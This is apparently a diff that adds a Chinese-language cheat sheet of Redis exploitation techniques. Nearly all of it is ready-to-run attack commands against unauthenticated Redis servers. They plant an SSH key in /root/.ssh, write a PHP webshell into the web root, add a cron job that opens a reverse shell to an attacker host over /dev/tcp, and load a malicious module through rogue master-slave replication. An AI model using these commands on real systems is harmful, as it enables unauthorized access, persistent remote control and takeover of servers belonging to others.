@@ -1,0 +1,40 @@
+# Redis 利用技巧
+
+## 未授权访问检测
+```bash
+redis-cli -h target -p 6379
+redis-cli -h target -p 6379 info
+redis-cli -h target -p 6379 CONFIG GET dir
+```
+
+## 写 SSH 密钥
+```bash
+redis-cli -h target config set dir /root/.ssh/
+redis-cli -h target config set dbfilename authorized_keys
+redis-cli -h target set pubkey "\n\n公钥内容\n\n"
+redis-cli -h target save
+```
+
+## 写 Webshell
+```bash
+redis-cli -h target config set dir /var/www/html/
+redis-cli -h target config set dbfilename shell.php
+redis-cli -h target set web "\n\n<?php system($_GET['cmd']);?>\n\n"
+redis-cli -h target save
+```
+
+## 写 crontab
+```bash
+redis-cli -h target config set dir /var/spool/cron/
+redis-cli -h target config set dbfilename root
+redis-cli -h target set cron "\n\n*/1 * * * * bash -i >& /dev/tcp/vps/4444 0>&1\n\n"
+redis-cli -h target save
+```
+
+## 主从复制 RCE
+```bash
+# 利用 redis-rogue-server
+python3 redis-rogue-server.py --rhost target --rport 6379 --lhost vps --lport 8888
+
+# 原理：建立主从关系，加载恶意模块
+```
